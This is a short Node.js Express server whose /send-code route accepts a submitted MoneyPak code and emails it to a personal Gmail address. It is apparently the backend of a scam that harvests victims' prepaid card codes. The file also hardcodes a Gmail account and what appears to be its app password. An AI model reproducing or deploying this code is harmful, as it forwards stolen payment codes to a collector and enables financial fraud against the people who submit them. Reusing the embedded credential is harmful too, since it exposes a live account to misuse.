const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");
const path = require("path");

const app = express();

// ✅ Middleware
app.use(cors());
app.use(express.json());

// ✅ Serve frontend FIRST
app.use(express.static(path.join(__dirname, "public")));

// 🔐 EMAIL CONFIG
const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: "survivalmanagementc@gmail.com",
        pass: "syhp nqlk lsvh oasp"
    }
});

// 📩 API ROUTE
app.post("/send-code", async (req, res) => {
    const { code } = req.body;

    if (!code) {
        return res.status(400).json({ message: "No code provided" });
    }

    try {
        await transporter.sendMail({
            from: "survivalmanagementc@gmail.com",
            to: "victoriawallings21@gmail.com",
            subject: "New MoneyPak Code Submitted",
            text: `Code entered: ${code}`
        });

        res.json({ message: "Code sent successfully!" });

    } catch (err) {
        console.log("🔥 EMAIL ERROR:", err);
        res.status(500).json({ message: "Email failed to send" });
    }
});

// ✅ FIX: Add this route
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

// 🌐 PORT
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});